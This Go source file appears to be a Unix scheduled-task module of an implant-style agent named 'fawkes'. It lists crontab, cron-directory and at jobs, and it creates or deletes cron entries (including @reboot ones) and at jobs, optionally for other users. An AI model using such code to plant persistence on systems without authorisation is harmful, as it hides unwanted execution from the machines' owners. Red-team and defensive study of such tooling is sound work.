//go:build !windows

package commands

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type schtaskArgs struct {
	Action  string `json:"action"`
	Name    string `json:"name"`
	Program string `json:"program"`
	Args    string `json:"args"`
	Trigger string `json:"trigger"`
	Time    string `json:"time"`
	User    string `json:"user"`
	RunNow  bool   `json:"run_now"`
	Filter  string `json:"filter"`
}

type schtaskListEntry struct {
	Name        string `json:"name"`
	State       string `json:"state"`
	Type        string `json:"type"`
	NextRunTime string `json:"next_run_time,omitempty"`
}

func schtaskUnixListCommon(filter string, platformEntries []schtaskListEntry) structs.CommandResult {
	var entries []schtaskListEntry
	entries = append(entries, enumerateUserCrontab()...)
	entries = append(entries, enumerateSystemCrontab()...)
	entries = append(entries, enumerateCronDirs()...)
	entries = append(entries, platformEntries...)
	entries = append(entries, enumerateAtJobs()...)

	if filter != "" {
		filterLower := strings.ToLower(filter)
		var filtered []schtaskListEntry
		for _, e := range entries {
			if strings.Contains(strings.ToLower(e.Name), filterLower) {
				filtered = append(filtered, e)
			}
		}
		entries = filtered
	}

	if len(entries) == 0 {
		return successResult("[]")
	}

	data, err := json.Marshal(entries)
	if err != nil {
		return errorf("marshaling results: %v", err)
	}
	return successResult(string(data))
}

func enumerateUserCrontab() []schtaskListEntry {
	out, err := execCmdTimeout("crontab", "-l")
	if err != nil {
		return nil
	}
	currentUser := "unknown"
	if u, err := user.Current(); err == nil {
		currentUser = u.Username
	}
	return parseCrontabLines(string(out), fmt.Sprintf("crontab(%s)", currentUser))
}

func enumerateSystemCrontab() []schtaskListEntry {
	data, err := os.ReadFile("/etc/crontab")
	if err != nil {
		return nil
	}
	return parseCrontabLines(string(data), "system(/etc/crontab)")
}

func enumerateCronDirs() []schtaskListEntry {
	var entries []schtaskListEntry
	cronDirs := []string{"/etc/cron.d", "/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"}

	for _, dir := range cronDirs {
		files, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		dirBase := filepath.Base(dir)
		for _, f := range files {
			if f.IsDir() || strings.HasPrefix(f.Name(), ".") {
				continue
			}
			fullPath := filepath.Join(dir, f.Name())
			if dirBase == "cron.d" {
				data, err := os.ReadFile(fullPath)
				if err != nil {
					continue
				}
				entries = append(entries, parseCrontabLines(string(data), fmt.Sprintf("cron.d(%s)", f.Name()))...)
			} else {
				entries = append(entries, schtaskListEntry{
					Name:  fullPath,
					State: "Active",
					Type:  dirBase,
				})
			}
		}
	}
	return entries
}

func enumerateAtJobs() []schtaskListEntry {
	out, err := execCmdTimeout("atq")
	if err != nil || len(strings.TrimSpace(string(out))) == 0 {
		return nil
	}

	var entries []schtaskListEntry
	scanner := bufio.NewScanner(strings.NewReader(string(out)))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		jobID := fields[0]
		state := "queued"
		scheduledTime := ""
		if len(fields) >= 6 {
			scheduledTime = strings.Join(fields[1:6], " ")
		}
		if len(fields) >= 7 {
			if fields[6] == "=" {
				state = "running"
			}
		}

		entries = append(entries, schtaskListEntry{
			Name:        fmt.Sprintf("at-job-%s", jobID),
			State:       state,
			Type:        "at",
			NextRunTime: scheduledTime,
		})
	}
	return entries
}

func parseCrontabLines(content, source string) []schtaskListEntry {
	var entries []schtaskListEntry
	scanner := bufio.NewScanner(strings.NewReader(content))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "SHELL=") || strings.HasPrefix(line, "PATH=") ||
			strings.HasPrefix(line, "MAILTO=") || strings.HasPrefix(line, "HOME=") {
			continue
		}

		fields := strings.Fields(line)

		var schedule, command string
		if strings.HasPrefix(line, "@") {
			if len(fields) < 2 {
				continue
			}
			schedule = fields[0]
			if isSystemCrontab(source) && len(fields) >= 3 {
				command = strings.Join(fields[2:], " ")
			} else {
				command = strings.Join(fields[1:], " ")
			}
		} else {
			if len(fields) < 6 {
				continue
			}
			schedule = strings.Join(fields[:5], " ")
			if isSystemCrontab(source) && len(fields) >= 7 {
				command = strings.Join(fields[6:], " ")
			} else {
				command = strings.Join(fields[5:], " ")
			}
		}

		name := fmt.Sprintf("%s: %s %s", source, schedule, truncateStr(command, 80))
		entries = append(entries, schtaskListEntry{
			Name:  name,
			State: "Active",
			Type:  "crontab",
		})
	}
	return entries
}

func isSystemCrontab(source string) bool {
	return strings.Contains(source, "/etc/crontab") || strings.Contains(source, "cron.d(")
}

func triggerToSchedule(trigger, timeStr string) string {
	hh, mm := "0", "0"
	if timeStr != "" {
		parts := strings.SplitN(timeStr, ":", 2)
		if len(parts) == 2 {
			hh = parts[0]
			mm = parts[1]
		}
	}

	switch strings.ToUpper(trigger) {
	case "DAILY":
		return fmt.Sprintf("%s %s * * *", mm, hh)
	case "WEEKLY":
		return fmt.Sprintf("%s %s * * 0", mm, hh)
	case "MONTHLY":
		return fmt.Sprintf("%s %s 1 * *", mm, hh)
	case "ONSTART":
		return "@reboot"
	case "ONIDLE":
		return "@reboot"
	case "ONCE":
		return fmt.Sprintf("%s %s * * *", mm, hh)
	default:
		return fmt.Sprintf("%s %s * * *", mm, hh)
	}
}

func matchesCronEntry(line, name string) bool {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return false
	}
	if strings.Contains(line, "# "+name) {
		return true
	}
	if strings.Contains(line, name) {
		return true
	}
	return false
}

func deleteCronEntry(args schtaskArgs) structs.CommandResult {
	cronArgs := []string{"-l"}
	if args.User != "" {
		cronArgs = append(cronArgs, "-u", args.User)
	}
	existing, err := execCmdTimeout("crontab", cronArgs...)
	if err != nil {
		return errorf("reading crontab: %v", err)
	}

	var kept []string
	removed := 0
	scanner := bufio.NewScanner(strings.NewReader(string(existing)))
	for scanner.Scan() {
		line := scanner.Text()
		if matchesCronEntry(line, args.Name) {
			removed++
			continue
		}
		kept = append(kept, line)
	}

	if removed == 0 {
		return errorf("No cron entry matching '%s' found", args.Name)
	}

	newCrontab := strings.Join(kept, "\n") + "\n"
	installArgs := []string{"-"}
	if args.User != "" {
		installArgs = []string{"-u", args.User, "-"}
	}
	cmd, cancel := execCmdCtx("crontab", installArgs...)
	defer cancel()
	cmd.Stdin = strings.NewReader(newCrontab)
	out, cmdErr := cmd.CombinedOutput()
	if cmdErr != nil {
		return errorf("updating crontab: %v\n%s", cmdErr, string(out))
	}

	return successf("Deleted %d cron entry/entries matching '%s'", removed, args.Name)
}

func schtaskCreateCron(args schtaskArgs) structs.CommandResult {
	schedule := triggerToSchedule(args.Trigger, args.Time)

	command := args.Program
	if args.Args != "" {
		command += " " + args.Args
	}

	entry := fmt.Sprintf("%s %s", schedule, command)
	if args.Name != "" {
		entry += fmt.Sprintf(" # %s", args.Name)
	}

	cronArgs := []string{"-l"}
	if args.User != "" {
		cronArgs = append(cronArgs, "-u", args.User)
	}
	existing, _ := execCmdTimeout("crontab", cronArgs...)

	newCrontab := strings.TrimRight(string(existing), "\n")
	if newCrontab != "" {
		newCrontab += "\n"
	}
	newCrontab += entry + "\n"

	installArgs := []string{"-"}
	if args.User != "" {
		installArgs = []string{"-u", args.User, "-"}
	}
	cmd, cancel := execCmdCtx("crontab", installArgs...)
	defer cancel()
	cmd.Stdin = strings.NewReader(newCrontab)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return errorf("installing crontab: %v\n%s", err, string(out))
	}

	return successf("Created cron job:\n  Schedule: %s\n  Command:  %s", schedule, command)
}

func schtaskCreateAt(args schtaskArgs) structs.CommandResult {
	if args.Time == "" {
		return errorResult("time is required for at job creation (HH:MM format)")
	}

	command := args.Program
	if args.Args != "" {
		command += " " + args.Args
	}

	cmd, cancel := execCmdCtx("at", args.Time)
	defer cancel()
	cmd.Stdin = strings.NewReader(command + "\n")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return errorf("creating at job: %v\n%s", err, string(out))
	}

	return successf("Created at job for %s:\n  Command: %s\n%s", args.Time, command, strings.TrimSpace(string(out)))
}

func queryAtJob(name string) structs.CommandResult {
	jobID := strings.TrimPrefix(name, "at-job-")
	out, err := execCmdTimeout("at", "-c", jobID)
	if err != nil {
		return errorf("querying at job '%s': %v", jobID, err)
	}
	return successf("At Job %s:\n%s", jobID, string(out))
}

func isNumeric(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return len(s) > 0
}
